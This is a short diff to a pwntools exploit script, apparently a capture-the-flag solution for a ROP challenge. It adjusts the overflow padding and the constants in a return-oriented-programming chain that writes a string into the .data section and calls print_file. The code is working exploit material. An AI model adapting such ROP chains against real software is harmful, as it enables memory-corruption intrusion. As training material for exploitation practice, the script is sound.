@@ -40,7 +40,7 @@ def conn():
 def solve():
     io = conn()
 
-    padding = cyclic(36)
+    padding = cyclic(44)
 
     payload = [
         padding,
@@ -50,7 +50,7 @@ def solve():
         elf.sym.data_start,
         ROPS.str_wd,
         elf.sym.data_start,  # ` -> a
-        0x00000101,
+        0x01010000,
         ROPS.ld_add,
         0xDEADBEEF,
         ROPS.pop_r3,
@@ -59,7 +59,7 @@ def solve():
         elf.sym.data_start + 4,
         ROPS.str_wd,
         elf.sym.data_start + 4,
-        0x01000100,
+        0x00010001,
         ROPS.ld_add,
         elf.sym.data_start,
         elf.plt.print_file
